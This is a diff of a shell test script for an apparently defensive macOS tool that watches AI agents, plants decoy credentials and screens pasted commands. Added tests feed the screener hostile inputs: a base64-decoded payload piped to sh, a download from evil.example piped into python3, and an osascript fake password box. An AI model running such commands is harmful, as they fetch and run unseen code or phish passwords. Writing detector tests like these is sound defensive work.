@@ -2,7 +2,7 @@
 # Leviathan tests. Uses a throwaway folder; changes no system settings.
 PY=/opt/homebrew/bin/python3; SRC="$(cd "$(dirname "$0")" && pwd)"
 T=$(mktemp -d); export LEVIATHAN_STATE="$T/state" LEVIATHAN_DOWNLOADS="$T/dl" LEVIATHAN_QUIET=1 LEVIATHAN_NO_SPAWN=1
-export LEVIATHAN_DRY_PAUSE=1 LEVIATHAN_PERSIST_DIRS="$T/agents"; mkdir -p "$LEVIATHAN_STATE" "$LEVIATHAN_DOWNLOADS" "$T/agents" "$T/.hidden"
+export LEVIATHAN_DRY_PAUSE=1 LEVIATHAN_PERSIST_DIRS="$T/agents" LEVIATHAN_CANARY_DIR="$T/canary"; mkdir -p "$LEVIATHAN_STATE" "$LEVIATHAN_DOWNLOADS" "$T/agents" "$T/.hidden"
 M="$PY $SRC/leviathan.py"; pass=0; fail=0
 ok() { if eval "$2"; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }
 
@@ -93,56 +93,16 @@ ok "Chrome judged safe" '[ ! -d "/Applications/Google Chrome.app" ] || [ "$($PY 
 # 8. levplus pure functions (no network, no system changes)
 LP="$PY $SRC/levplus.py"
 
-# 8a. clip_check (use valid-length BTC bech32 addresses)
-BTC1="bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
-BTC2="bc1qtesttesttesttesttesttesttesttesttesttest"
-ok "clip_check: same BTC bech32 -> warn" '[ -n "$(LEVIATHAN_CLIP_OLD="$BTC1" $M clip <<<"$BTC2" 2>&1)" ]'
-ok "clip_check: different kinds -> no warn" '[ -z "$(LEVIATHAN_CLIP_OLD="$BTC1" $M clip <<<"0x1234567890123456789012345678901234567890" 2>&1)" ]'
-ok "clip_check: same address -> no warn" '[ -z "$(LEVIATHAN_CLIP_OLD="$BTC1" $M clip <<<"$BTC1" 2>&1)" ]'
-ok "clip_check: non-crypto -> no warn" '[ -z "$(LEVIATHAN_CLIP_OLD=hello $M clip <<<"world" 2>&1)" ]'
-
-# 8b. seed_phrase
-ok "seed_phrase: 12 words valid" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q True'
-ok "seed_phrase: 12 words 90% valid" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon able about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q True'
-ok "seed_phrase: 11 words -> false" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q False'
-ok "seed_phrase: 12 words 80% -> false" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon foo bar baz" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q False'
-
-# 8c. sandbox_profile contains required denies
-PROF=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.sandbox_profile('/Users/test', 'container1', False))")
-ok "sandbox_profile denies home" 'echo "$PROF" | grep -q "deny file-read.*Users/test"'
-ok "sandbox_profile allows container" 'echo "$PROF" | grep -q "allow file-read.*Leviathan/sandbox/container1"'
-ok "sandbox_profile denies network by default" 'echo "$PROF" | grep -q "deny network"'
-PROF_NET=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.sandbox_profile('/Users/test', 'container1', True))")
-ok "sandbox_profile allows network with --net" '! echo "$PROF_NET" | grep -q "deny network"'
-ok "sandbox_profile denies ssh" 'echo "$PROF" | grep -q "deny file-read.*\.ssh"'
-ok "sandbox_profile denies keychains" 'echo "$PROF" | grep -q "deny file-read.*Keychains"'
 
 # 8d. parse_ps
 PARSE_OUT=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps('123 claude\n456 codex --arg\n789 node something'))")
 ok "parse_ps extracts pid and cmd" 'echo "$PARSE_OUT" | grep -q "123" && echo "$PARSE_OUT" | grep -q "claude" && echo "$PARSE_OUT" | grep -q "456" && echo "$PARSE_OUT" | grep -q "codex"'
 
-# 8e. level/mode settings
-$M level 3 >/dev/null
-ok "level set to 3" '[ "$($M level --json | $PY -c "import json,sys;print(json.load(sys.stdin)[\"level\"])")" = "3" ]'
-$M mode crypto on >/dev/null
-ok "mode crypto on" '[ "$($M mode --json | $PY -c "import json,sys;print(json.load(sys.stdin)[\"crypto\"])")" = "True" ]'
-$M mode apps off >/dev/null
-ok "mode apps off" '[ "$($M mode --json | $PY -c "import json,sys;print(json.load(sys.stdin)[\"apps\"])")" = "False" ]'
-
-# 8f. snapshot/diff
-export LEVIATHAN_APP_DIRS="$T/apps"
-$M snapshot >/dev/null
-ok "snapshot created" '[ -f "$LEVIATHAN_STATE/snapshot.json" ]'
-mkdir -p "$T/apps/NewApp.app/Contents/MacOS"; echo "hi" > "$T/apps/NewApp.app/Contents/MacOS/NewApp"
-DIFF_OUT=$($M diff 2>&1)
-ok "diff detects new app" 'echo "$DIFF_OUT" | grep -q "NewApp"'
-$M diff --undo >/dev/null 2>&1
-ok "diff --undo contains new app" '[ ! -x "$T/apps/NewApp.app/Contents/MacOS/NewApp" ]'
 
 # 8g. agents canary
 $M agents canary on >/dev/null
-ok "canary files created" '[ -f "$HOME/.leviathan-canary/aws_credentials" ] && [ -f "$HOME/.leviathan-canary/wallet_seed.txt" ]'
-CAN_OUT=$($M agents check 2>&1)
+ok "canary files created" '[ -f "$LEVIATHAN_CANARY_DIR/aws_credentials" ] && [ -f "$LEVIATHAN_CANARY_DIR/wallet_seed.txt" ]'
+CAN_OUT=$($M agents canary 2>&1)
 ok "agents check runs" '[ -n "$CAN_OUT" ]'
 
 # 8h. agents config audit (read-only, just runs)
@@ -166,73 +126,16 @@ else
   ok "pkg_inspect flags suspicious (fallback)" 'echo "$PKG_OUT" | grep -q "FLAGS"'
 fi
 
-# 8j. tor_check runs (no Tor Browser, just returns not found)
-TOR_OUT=$($M tor 2>&1)
-ok "tor_check runs" 'echo "$TOR_OUT" | grep -q "not found\|Found"'
-
-# 8k. cost runs
-$M cost >/dev/null
-ok "cost runs" '[ $? = 0 ]'
 
 # 8l. note-event
 $M note-event test_kind "test detail" >/dev/null
 ok "note-event logs to ledger" 'grep -q "test_kind" "$LEVIATHAN_STATE/ledger.jsonl"'
 
-# 8m. wallet_apps runs (read-only)
-$PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.wallet_apps())" >/dev/null
-ok "wallet_apps runs" '[ $? = 0 ]'
-
-# 8n. agent_level get/set
-$M agents level 1 >/dev/null
-ok "agent level set to 1" 'LEVIATHAN_STATE="$LEVIATHAN_STATE" $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.get_agent_level())" | grep -q "^1$"'
-$M agents level 3 >/dev/null
-ok "agent level set to 3" 'LEVIATHAN_STATE="$LEVIATHAN_STATE" $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.get_agent_level())" | grep -q "^3$"'
-
-# 8o. agents_canary_on creates tripwire instruction
-$M agents canary on >/dev/null
-ok "canary has tripwire instruction" 'grep -q "leviathan agents tripped" "$HOME/.leviathan-canary/aws_credentials"'
-ok "canary has unique marker" 'grep -q "Canary:" "$HOME/.leviathan-canary/aws_credentials"'
-
-# 8p. agents_tripped (just verify command exists)
-$M agents tripped 2>&1 | grep -q "Tripwire triggered"
-ok "agents tripped command runs" '[ $? = 0 ]'
-
-# 8q2. agents_tripped output contains expected string
-TRIPPED_OUT=$($M agents tripped 2>&1)
-ok "agents tripped output mentions tripwire" 'echo "$TRIPPED_OUT" | grep -q "Tripwire triggered"'
-
-# 8q. sandbox_profile_agent contains required denies
-PROF_AGENT=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.sandbox_profile_agent('/Users/test', 'container1', '/Users/test/project'))")
-ok "sandbox_profile_agent denies home" 'echo "$PROF_AGENT" | grep -q "deny file-read.*Users/test"'
-ok "sandbox_profile_agent allows project dir" 'echo "$PROF_AGENT" | grep -q "allow file-read.*Users/test/project"'
-ok "sandbox_profile_agent allows tmp writes" 'echo "$PROF_AGENT" | grep -q "allow file-write.*/private/tmp"'
-ok "sandbox_profile_agent denies network" 'echo "$PROF_AGENT" | grep -q "deny network"'
-ok "sandbox_profile_agent allows HTTPS only" 'echo "$PROF_AGENT" | grep -q "remote tcp \"\*:443\""'
-# 8q2. profiles are enforced by the real sandbox-exec, not just present as text
-RT=$(cd "$T" && pwd -P); echo "$PROF" | sed "s#/Users/test#$RT/home#g" > "$T/app.sb"; mkdir -p "$T/home/Library/Application Support/Leviathan/sandbox/container1"; echo s > "$T/home/secret"; echo c > "$T/home/Library/Application Support/Leviathan/sandbox/container1/f"
-ok "sandbox blocks home files" '! sandbox-exec -f "$T/app.sb" /bin/cat "$T/home/secret" >/dev/null 2>&1'
-ok "sandbox allows its container" 'sandbox-exec -f "$T/app.sb" /bin/cat "$T/home/Library/Application Support/Leviathan/sandbox/container1/f" >/dev/null 2>&1'
-ok "sandbox allows macOS files" 'sandbox-exec -f "$T/app.sb" /bin/ls /System >/dev/null 2>&1'
-ok "sandbox blocks internet" '! sandbox-exec -f "$T/app.sb" /usr/bin/python3 -I -c "import socket;socket.create_connection((\"1.1.1.1\",443),timeout=5)" 2>/dev/null'
 
 # 8r. ai_safety_check runs (read-only)
 $M ai safety >/dev/null
 ok "ai safety check runs" '[ $? = 0 ]'
 
-# 8s. ai_tuneup runs (read-only)
-$M ai tuneup >/dev/null
-ok "ai tuneup runs" '[ $? = 0 ]'
-
-# 8t. agents_export_jsonl produces valid jsonl
-EXPORT_OUT=$($M agents export --jsonl 2>&1)
-ok "agents export --jsonl runs" '[ $? = 0 ]'
-
-# 8u. VPN was removed in 2.0.7: the command no longer exists
-ok "vpn command removed" '! $M vpn status >/dev/null 2>&1'
-
-# 8v. agent_level_costs returns dict
-$PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.agent_level_costs())" | grep -q "Watch"
-ok "agent_level_costs returns dict" '[ $? = 0 ]'
 
 # 8w. parse_ps handles edge cases
 PARSE_OUT2=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps(''))")
@@ -240,13 +143,6 @@ ok "parse_ps empty input" '[ "$PARSE_OUT2" = "[]" ]'
 PARSE_OUT3=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps('123 cmd\ninvalid'))")
 ok "parse_ps skips invalid" 'echo "$PARSE_OUT3" | grep -q "123"'
 
-# 8x. clip_check edge cases
-ok "clip_check empty strings" '[ -z "$(LEVIATHAN_CLIP_OLD="" $M clip <<<"" 2>&1)" ]'
-ok "clip_check whitespace only" '[ -z "$(LEVIATHAN_CLIP_OLD=" " $M clip <<<"  " 2>&1)" ]'
-
-# 8y. seed_phrase edge cases
-ok "seed_phrase empty" 'echo "" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q False'
-ok "seed_phrase 24 words valid" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q True'
 
 # 8z. AI safety fixes (2.0.5)
 lp() { $PY -c "import sys; sys.path.insert(0,\"$SRC\"); import levplus as P; print($1)"; }
@@ -256,16 +152,8 @@ ok "bypass: normal mode clean" "[ \"\$(lp 'bool(P.claude_bypass({\"permissions\"
 ok "bypass: junk input clean" "[ \"\$(lp 'bool(P.claude_bypass([]))')\" = False ]"
 ok "codex: full access found" "[ \"\$(lp 'bool(P.codex_full_access(\"approval_policy = \\\"never\\\"\"))')\" = True ]"
 ok "codex: on-request clean" "[ \"\$(lp 'bool(P.codex_full_access(\"approval_policy = \\\"on-request\\\"\"))')\" = False ]"
-ok "listeners: loopback left out" "[ \"\$(lp 'P.parse_listeners(\"p1\\ncfoo\\nn127.0.0.1:631\\nn[::1]:5\\nn*:7000\")')\" = \"[('1', 'foo', '*:7000')]\" ]"
-ok "listeners: empty input" "[ \"\$(lp 'P.parse_listeners(\"\")')\" = '[]' ]"
 $M agents canary on >/dev/null
-CODE=$(grep Canary "$HOME/.leviathan-canary/aws_credentials" | awk '{print $3}')
-ok "decoy has a real code" '[ ${#CODE} = 16 ] && [ "$CODE" != unknown ]'
-ok "decoy code is in the fake key" 'grep -q "AKIA$CODE" "$HOME/.leviathan-canary/aws_credentials"'
-ok "whois finds the code" '$M agents whois "$CODE" | grep -q "was written"'
-ok "whois finds the code inside a leaked key" '$M agents whois "AKIA$CODE" | grep -q "was written"'
-ok "whois unknown code" '$M agents whois 0000 | grep -q "No decoy code"'
-sleep 2; cat "$HOME/.leviathan-canary/wallet_seed.txt" >/dev/null
+sleep 2; cat "$LEVIATHAN_CANARY_DIR/wallet_seed.txt" >/dev/null
 ok "decoy read detected" '$M agents canary | grep -q "wallet_seed.txt was read"'
 ok "decoy read reported once" '! $M agents canary | grep -q "wallet_seed.txt was read"'
 ok "monitor idle while mode off" '$M agents monitor | grep -q "mode is off"'
@@ -280,27 +168,26 @@ ok "mcp: finds servers in .claude.json and projects" "[ \"$(lp "sorted(P.claude_
 SPD="$T/Application Support/x.app/Contents/MacOS"; mkdir -p "$SPD"; printf '#!/bin/sh\n' > "$SPD/claude"; chmod +x "$SPD/claude"; touch "$T/Application"
 ok "parse_ps rejoins a path with spaces" "[ \"\$(lp \"P.parse_ps('7 $T/Application Support/x.app/Contents/MacOS/claude --flag')[0][1]\")\" = \"['$T/Application Support/x.app/Contents/MacOS/claude', '--flag']\" ]"
 ok "parse_ps leaves normal commands alone" "[ \"\$(lp \"P.parse_ps('8 /bin/ls -la')[0][1]\")\" = \"['/bin/ls', '-la']\" ]"
-ok "tripwire never freezes during tests" '$M agents tripped | grep -qv "was paused"'
 $PY -c "import sys; sys.path.insert(0,'$SRC'); import leviathan as L; L.ledger_add('canary-trigger', details=['Decoy aws_credentials was read'])"
 ok "status shows AI alerts" '$M status | grep -q "AI alert, canary-trigger: Decoy aws_credentials was read"'
-TH=$(mktemp -d); bi() { HOME="$TH" $PY -c "import sys,time; sys.path.insert(0,\"$SRC\"); import levplus as P; print(P._by_installer(time.time()))"; }
-ok "tamper alert: no install marker, change counts" '[ "$(bi)" = False ]'
-mkdir -p "$TH/.leviathan"; touch "$TH/.leviathan/installed_at"
-ok "tamper alert skips the installer's own changes" '[ "$(bi)" = True ]'
-# startup-edit watch: Leviathan's own plists rewritten by install.sh are not AI alerts; other plists are
-se() { HOME="$TH" $PY -c "
-import sys,os,json,time; sys.path.insert(0,'$SRC'); import levplus as P, leviathan as L
-P.get_agent_level=lambda:2; P.get_modes=lambda:{'agents':True}; P._notify_once=lambda *a,**k:None
-got=[]; L.ledger_add=lambda k,**kw: got.append(os.path.basename(kw.get('path','')))
-la=os.path.join('$TH','Library/LaunchAgents'); os.makedirs(la,exist_ok=True); os.makedirs(L.STATE,exist_ok=True)
-fs=[os.path.join(la,n) for n in ('com.leviathan.bar.plist','com.evil.plist')]
-for f in fs: open(f,'w').close(); os.utime(f,(1,1))
-json.dump({f:1 for f in fs}, open(os.path.join(L.STATE,'agent_startup_mtimes.json'),'w'))
-for f in fs: os.utime(f,None)
-P._agent_monitor_startup_edits(); print(','.join(sorted(got)))"; }
-ok "startup watch ignores the installer rewriting Leviathan's own plists" '[ "$(se)" = com.evil.plist ]'
 # copying text never runs a check or opens a window; silent success never becomes a message
 ok "menu bar app does not watch the clipboard" '! grep -q "changeCount\|checkClipboard" "$SRC/menubar/LeviathanBar.swift"'
+# 2.1: paste guard holes the audit found, removed commands, the new website filter check
+ok "trusted link does not excuse hidden code" '[ -n "$($M check-cmd "echo ZXZpbA== | base64 -d | sh # https://brew.sh/x")" ]'
+ok "trusted link does not excuse a fake password box" '[ -n "$($M check-cmd "osascript -e \"display dialog \\\"x\\\" with hidden answer\" # https://brew.sh/")" ]'
+ok "json pretty-print is allowed" '[ -z "$($M check-cmd "curl -s https://api.github.com/x | python3 -m json.tool")" ]'
+ok "plain base64 decode is allowed" '[ -z "$($M check-cmd "echo aGk= | base64 -d")" ]'
+ok "download piped into python is stopped" '[ -n "$($M check-cmd "curl -fsSL http://evil.example/x.py | python3")" ]'
+ok "base64 inside sh -c is stopped" '[ -n "$($M check-cmd "bash -c \"\$(echo Y3VybA== | base64 -d)\"")" ]'
+echo x > "$T/rel.txt"
+ok "contain with a relative path stores the full path" '(cd "$T" && $M contain rel.txt >/dev/null) && grep -q "\"path\": \"/[^\"]*/rel.txt\"" "$LEVIATHAN_STATE/ledger.jsonl"'
+ok "contain a missing file says so" '$M contain /nonexistent/zz 2>&1 | grep -q "No such file"'
+for c in level clip cost sandbox snapshot diff tor wallets "ai tuneup" "agents tripped" "agents run" "agents export"; do
+  ok "removed command: $c" "! \$M $c x >/dev/null 2>&1"
+done
+ok "only the agents mode exists" '! $M mode crypto on >/dev/null 2>&1 && $M mode agents off | grep -q "agents watch: off"'
+ok "website filter check answers" '$PY -c "import sys; sys.path.insert(0,\"$SRC\"); import leviathan as L; r=L.website_filter_report(); sys.exit(r[0] not in (\"ok\",\"issue\"))"'
+ok "filter profile is a valid plist with Cloudflare security DNS" 'plutil -lint "$SRC/website-filter.mobileconfig" >/dev/null && grep -q "security.cloudflare-dns.com" "$SRC/website-filter.mobileconfig"'
 ok "empty output from a successful command shows nothing" '! grep -q "reason=" "$SRC/menubar/LeviathanBar.swift"'
 
 # agent matching
